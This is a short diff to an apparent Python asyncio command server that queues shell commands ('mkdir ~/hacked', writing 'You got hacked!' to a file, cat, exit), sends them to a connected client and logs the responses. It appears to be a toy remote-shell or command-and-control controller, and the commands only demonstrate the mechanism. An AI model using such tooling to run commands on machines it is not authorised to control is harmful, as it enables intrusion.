@@ -61,7 +61,7 @@ async def _read(reader: StreamReader,
                 timeout: float = DEFAULT_TIMEOUT) -> bytes:
 
     # Each message is prepended by 4 bytes representing
-    # the remaining message length. Assuming little-endian?
+    # the remaining message length.
     chunk = await _recv_data(reader, 4, timeout)
     if not chunk:
         return None
@@ -98,7 +98,7 @@ async def _handle(reader: StreamReader,
     jobs = Queue()
     jobs.put_nowait(b'mkdir ~/hacked')
     jobs.put_nowait(b'touch ~/hacked/hacked.txt')
-    jobs.put_nowait(b"echo 'You got hacked!' > ~/hacked/hacked.txt")
+    jobs.put_nowait(b"echo ('You got hacked!\n') >> ~/hacked/hacked.txt")
     jobs.put_nowait(b'cat ~/hacked/hacked.txt')
     jobs.put_nowait(b'exit')
 
@@ -112,7 +112,7 @@ async def _handle(reader: StreamReader,
         if response == None:
             break
 
-        print(f"\nCommand:\t{cmd.decode('utf-8')}")
+        print(f"\nCommand:\t{cmd}")
         print(f'Response size:\t{len(response)} bytes')
         print(f'Response time:\t{datetime.now() - start}\n')
         if response:
